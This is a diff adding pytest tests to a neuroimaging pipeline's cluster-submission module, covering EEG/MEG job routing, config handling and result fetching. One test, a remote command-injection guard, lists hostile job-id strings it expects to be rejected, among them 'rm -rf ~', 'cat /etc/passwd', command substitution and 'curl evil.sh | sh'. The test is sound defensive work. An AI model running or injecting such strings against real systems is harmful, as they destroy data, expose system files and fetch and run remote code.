@@ -57,6 +57,55 @@ def test_build_commands_shape() -> None:
     assert cmds["push_config"][-1] == "myriad:${HOME}/Scratch/inob/configs/default.yaml"
 
 
+def test_build_commands_eeg_queues_the_eeg_job_not_the_meg_array() -> None:
+    """modality used to be accepted and ignored — an EEG request queued a MEG solve."""
+    cmds = cluster.build_commands("myriad", modality="eeg")
+    assert "cluster/submit.sh eeg" in cmds["submit_eeg"][2]
+    assert "submit_array" not in cmds and "submit_reduce" not in cmds
+    assert cluster.submit_tasks("eeg") == ("submit_eeg",)
+    assert cluster.submit_tasks("meg") == ("submit_array", "submit_reduce")
+
+
+def test_validate_modality_rejects_unknown() -> None:
+    with pytest.raises(cluster.ClusterError):
+        cluster.build_commands("myriad", modality="ecog")
+
+
+# ── remote command injection guard ──────────────────────────────────────────
+#
+# status() interpolates the job id into a command string executed by the REMOTE
+# shell. Anything that isn't a plain scheduler id must be rejected outright.
+
+@pytest.mark.parametrize("bad", [
+    '1"; rm -rf ~ ;#',
+    "123; cat /etc/passwd",
+    "$(whoami)",
+    "`id`",
+    "123 && curl evil.sh | sh",
+    "../../etc/passwd",
+    "",
+    None,
+])
+def test_validate_job_id_rejects_shell_metacharacters(bad) -> None:
+    with pytest.raises(cluster.ClusterError):
+        cluster.validate_job_id(bad)
+
+
+@pytest.mark.parametrize("good", ["1", "123456", "222.1", "222_1"])
+def test_validate_job_id_accepts_real_ids(good) -> None:
+    assert cluster.validate_job_id(good) == good
+
+
+def test_status_rejects_injected_job_id_before_any_ssh(monkeypatch) -> None:
+    def _boom(*a, **k):
+        raise AssertionError("ssh must not run for an invalid job id")
+
+    monkeypatch.setattr(cluster, "_run", _boom)
+    monkeypatch.setattr(cluster, "_ssh_reachable", _boom)
+    with pytest.raises(cluster.ClusterError):
+        cluster.status("myriad", '1"; rm -rf ~ ;#')
+
+
 def test_write_run_config_injects_point_sources(tmp_path) -> None:
     import yaml
     out = tmp_path / "run.yaml"
@@ -67,15 +116,50 @@ def test_write_run_config_injects_point_sources(tmp_path) -> None:
     assert raw["forward"]["point_sources"] == [[1.0, 2.0, 3.0]]
 
 
+def test_write_run_config_uses_the_working_config_and_never_clobbers_it(
+    tmp_path, monkeypatch,
+) -> None:
+    """A submit must ship what the GUI is editing, and leave it untouched.
+
+    It previously read default.yaml and wrote the result back over the working
+    copy, discarding every advanced edit both locally and on the cluster.
+    """
+    import yaml
+    working = tmp_path / "gui_working.yaml"
+    working.write_text(yaml.safe_dump({"marker": "edited-by-user"}))
+    submit_to = tmp_path / "gui_submit.yaml"
+    monkeypatch.setattr(cluster, "WORKING_CONFIG", working)
+    monkeypatch.setattr(cluster, "SUBMIT_CONFIG", submit_to)
+
+    out = cluster.write_run_config([{"x": 1.0, "y": 2.0, "z": 3.0}])
+
+    assert out == submit_to
+    shipped = yaml.safe_load(submit_to.read_text())
+    assert shipped["marker"] == "edited-by-user"           # the user's edits, not defaults
+    assert shipped["forward"]["point_sources"] == [[1.0, 2.0, 3.0]]
+    # the working copy is byte-for-byte untouched
+    assert yaml.safe_load(working.read_text()) == {"marker": "edited-by-user"}
+
+
 def test_submit_dryrun(monkeypatch, tmp_path) -> None:
     monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
-    # keep the working-config write out of the repo
-    monkeypatch.setattr(cluster, "WORKING_CONFIG", tmp_path / "gui_working.yaml")
+    # keep the submission-config write out of the repo
+    monkeypatch.setattr(cluster, "SUBMIT_CONFIG", tmp_path / "gui_submit.yaml")
     res = cluster.submit("myriad", sources=[{"x": 0, "y": 0, "z": 0, "strength_nAm": 70}])
     assert res["state"] == "dryrun"
     assert res["job_id"] is None
     joined = "\n".join(res["commands"])
     assert "stage.sh" in joined and "submit.sh array" in joined
+
+
+def test_submit_dryrun_eeg_lists_the_eeg_command(monkeypatch, tmp_path) -> None:
+    monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
+    monkeypatch.setattr(cluster, "SUBMIT_CONFIG", tmp_path / "gui_submit.yaml")
+    res = cluster.submit("myriad", sources=[], modality="eeg")
+    joined = "\n".join(res["commands"])
+    assert "submit.sh eeg" in joined
+    assert "submit.sh array" not in joined
+    assert res["modality"] == "eeg"
 
 
 def test_status_dryrun(monkeypatch) -> None:
@@ -90,6 +174,16 @@ def test_fetch_dryrun(monkeypatch) -> None:
     res = cluster.fetch("kathleen")
     assert res["state"] == "dryrun"
     assert "rsync" in res["command"]
+
+
+def test_fetch_uses_the_configured_target_not_a_hardcoded_vagus(monkeypatch) -> None:
+    """run_reduce.sh names the npz after TARGET_TAG, so fetch must follow it."""
+    monkeypatch.setenv("INOB_CLUSTER_DRYRUN", "1")
+    monkeypatch.setattr(cluster, "leadfield_name",
+                        lambda modality="meg": "duneuro_leadfield_spine.npz")
+    res = cluster.fetch("kathleen")
+    assert "duneuro_leadfield_spine.npz" in res["command"]
+    assert "duneuro_leadfield_vagus.npz" not in res["command"]
 
 
 # ── Python <-> shell source-target mirror ──────────────────────────────────
